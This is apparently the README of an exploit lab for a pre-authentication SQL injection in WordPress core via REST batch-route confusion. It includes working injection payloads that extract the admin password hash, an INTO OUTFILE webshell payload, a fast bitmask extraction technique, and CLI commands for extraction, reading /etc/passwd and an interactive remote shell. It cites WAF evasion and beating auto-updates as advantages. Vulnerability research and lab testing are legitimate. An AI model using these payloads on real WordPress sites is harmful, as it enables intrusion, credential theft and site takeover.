# wp2shell-lab

Educational PoC and lab for **CVE-2026-63030 + CVE-2026-60137** — pre-authentication SQL injection in WordPress core via REST batch-route confusion.

Discovered by Adam Kues (Searchlight Cyber / Assetnote). Fixed in WordPress 6.9.5 / 7.0.2.

| Version | Status |
|---------|--------|
| &lt; 6.9.0 | not affected |
| 6.9.0 – 6.9.4 | **affected** |
| 7.0.0 – 7.0.1 | **affected** |

## The vulnerability in one diagram

```
 ATTACKER (anonymous)
    │
    │  POST /?rest_route=/batch/v1          ← no auth required
    │
    ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │  OUTER BATCH  (serve_batch_request_v1)                          │
 │                                                                  │
 │  sub-requests:                                                   │
 │    [0]  "http://"            ← fails wp_parse_url()              │
 │    [1]  POST /wp/v2/posts    ← body carries inner batch          │
 │    [2]  POST /batch/v1       ← supplies batch handler            │
 │                                                                  │
 │  $validation:  [ error,  OK(posts),    OK(batch)  ]              │
 │  $matches:     [         posts_handler, batch_handler ]          │
 │                 ↑                                                │
 │                 BUG: error skipped in $matches, arrays misalign  │
 │                                                                  │
 │  dispatch: request[1] (posts) gets $matches[1] (batch handler)  │
 │            → posts body executed as a nested batch               │
 └──────────────────────────────┬───────────────────────────────────┘
                                │
                                ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │  INNER BATCH  (recursive serve_batch_request_v1)                │
 │                                                                  │
 │  sub-requests:                                                   │
 │    [0]  "http://"            ← same desync trick                 │
 │    [1]  POST /categories     ← author_exclude=<SQLI>            │
 │    [2]  GET  /wp/v2/posts    ← supplies posts handler            │
 │                                                                  │
 │  Same misalignment:                                              │
 │  request[1] (categories) gets $matches[1] (posts get_items)     │
 │                                                                  │
 │  categories schema has no author_exclude → value unsanitized    │
 │  posts get_items maps author_exclude → WP_Query::author__not_in │
 └──────────────────────────────┬───────────────────────────────────┘
                                │
                                ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │  WP_Query (vulnerable code, pre-6.9.5)                          │
 │                                                                  │
 │  // author__not_in is a STRING, not an array                     │
 │  // is_array() check fails → absint() sanitization skipped      │
 │  // raw string interpolated directly into SQL                    │
 │                                                                  │
 │  $where .= "AND post_author NOT IN ($author__not_in)"           │
 │                                       ^^^^^^^^^^^^               │
 │                                       attacker-controlled        │
 │                                                                  │
 │  → SQL INJECTION                                                 │
 └──────────────────────────────────────────────────────────────────┘
```

## Step by step

### Step 1: The batch endpoint is unauthenticated

`POST /wp-json/batch/v1` lets you send multiple REST API calls in one request. It has **no auth check** — security is delegated to each sub-request's own permission callback.

### Step 2: The desync

`serve_batch_request_v1()` builds two parallel arrays:

- `$matches[]` — which handler to **dispatch** each sub-request to
- `$validation[]` — whether each sub-request **passed validation**

It indexes both by the same offset during dispatch. The bug: when a sub-request's path fails `wp_parse_url()`, a `WP_Error` is pushed to `$validation` but **not** `$matches`. This shifts `$matches` by one, so each subsequent sub-request is dispatched to the **wrong handler**.

### Step 3: Double nesting

The desync is used **twice**:

1. **Outer batch** — a `/wp/v2/posts` request carrying an inner batch as its body gets dispatched under the **batch handler** (self-call). Since it was validated as a posts request, the inner `requests` array was never checked against the batch schema. This bypasses the method allowlist — inner sub-requests can use GET.

2. **Inner batch** — a `/wp/v2/categories?author_exclude=<SQLI>` request gets dispatched under posts `get_items()`. The categories schema doesn't define `author_exclude`, so it passes validation untouched. But posts `get_items()` maps it to `WP_Query::author__not_in`, where the value is interpolated raw into SQL.

### Step 4: The SQL injection

The vulnerable `WP_Query` code only sanitized `author__not_in` when it was already an array:

```php
// PRE-FIX (vulnerable)
if (is_array($query_vars['author__not_in'])) {
    $query_vars['author__not_in'] = array_map('absint', ...);  // sanitize
}
$author__not_in = implode(',', (array) $query_vars['author__not_in']);
$where .= " AND post_author NOT IN ($author__not_in) ";        // raw interpolation
```

A string value bypasses the `is_array()` gate entirely. The `(array)` cast wraps it without sanitizing.

### Step 5: What you can do with it

**Read the database** (every affected site):
```
author_exclude = 0) AND (ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1)) > 80)-- -
```
Boolean oracle: posts returned = true, empty = false. Binary search per character.

**Write files** (requires MySQL FILE privilege — not the default):
```
author_exclude = 0) AND 1=0 UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/path/shell.php'-- -
```

## Why fast extraction matters when RCE exists

The INTO OUTFILE RCE requires **MySQL FILE privilege** — the DB user must have `GRANT FILE ON *.*`. This is **not** the WordPress default. Managed hosts (cPanel, WP Engine, Kinsta, etc.) grant per-database privileges only. FILE shows up mainly on self-managed VPS/DIY stacks.

On the vast majority of real WordPress sites:

```
                    ┌─────────────────────┐
                    │   Can you get RCE?  │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  DB user has FILE?  │
                    └──────────┬──────────┘
                          ╱          ╲
                        yes           no (most sites)
                        ╱               ╲
               ┌───────▼──────┐   ┌─────▼──────────────────┐
               │ INTO OUTFILE │   │ Extract admin hash     │
               │ → webshell   │   │ → crack offline        │
               │ (1 request)  │   │ → login → upload plugin│
               └──────────────┘   └─────┬──────────────────┘
                                        │
                                   how many requests
                                   to extract the hash?
                                        │
                                  ╱            ╲
                             blind              fast
                            ~224 req           ~3 req
                            ~2 min             ~1 sec
```

For the **common case** (no FILE privilege), the attack path is: extract admin password hash → crack it offline → log in → upload a plugin webshell. The hash extraction is the bottleneck. Blind extraction takes ~224 HTTP requests (~2 minutes). Fast extraction does it in ~3 requests (~1 second). That matters for:

- **Detection evasion** — 3 requests vs 224 in WAF logs
- **Race conditions** — extract before auto-update patches the site
- **Practical speed** — on an engagement with many WordPress targets

## What's new in this repo

### X-WP-Total bitmask oracle

WordPress adds `SQL_CALC_FOUND_ROWS` to post queries and puts the count in the `X-WP-Total` response header. UNION rows are counted at the SQL level even though PHP filters them from the response body. We use conditional UNIONs to encode individual bits:

```sql
0) AND 1=0
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 1) > 0   -- bit 0
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 4) > 0   -- bit 2
...                                                            -- bits 3-6
-- -
```

X-WP-Total = 0 (bit not set) or 1 (bit set). Seven probes = one full ASCII character.

### Unlimited inner batch

The outer batch endpoint validates `maxItems: 25` via its schema. But the route confusion bypasses this — the inner batch runs through `serve_batch_request_v1()` recursively with **no size check**. We pack all 7 bit-probes for multiple characters into one inner batch.

16 characters × 7 bits = 112 probes per HTTP request. A 34-char phpass hash in ~3 requests.

## Quick start

```bash
# bring up the vulnerable lab
cd docker && ./setup.sh
cd ..

# detect
python3 -m exploit check http://localhost:8888
python3 -m exploit check http://localhost:8888 --confirm-sqli

# extract data (fast mode, default)
python3 -m exploit extract http://localhost:8888 --preset fingerprint
python3 -m exploit extract http://localhost:8888 --preset users

# extract data (blind mode, for comparison)
python3 -m exploit extract http://localhost:8888 --mode blind --preset fingerprint

# custom SQL query
python3 -m exploit extract http://localhost:8888 --query "SELECT @@version"

# RCE (requires FILE privilege — the lab grants it)
python3 -m exploit rce http://localhost:8888 --cmd "id"
python3 -m exploit rce http://localhost:8888 --cmd "cat /etc/passwd"
python3 -m exploit rce http://localhost:8888 -i   # interactive shell

# proxy through Burp
python3 -m exploit extract http://localhost:8888 --proxy http://127.0.0.1:8080

# tear down
cd docker && ./setup.sh down
```

## Modules

```
exploit/
├── batch.py      payload construction + HTTP client
├── detect.py     marker probe (safe) + timing confirmation
├── blind.py      boolean oracle, binary search, 1 bit/request
├── fast.py       X-WP-Total bitmask oracle, batch-parallel, ~16 chars/request
├── rce.py        INTO OUTFILE webshell (needs FILE privilege)
└── __main__.py   CLI: check, extract, rce, debug-fast

docker/
├── compose.yaml  WordPress 6.9.4 + MySQL 8.0
├── init.sql      grants FILE privilege for RCE testing
└── setup.sh      one-command lab setup
```

## References

- [WordPress 7.0.2 release](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
- [Searchlight Cyber advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core)
- [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) (route confusion)
- [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) (SQLi)

## Legal

For authorized security testing and education only. Use exclusively against systems you own or have explicit written permission to test.
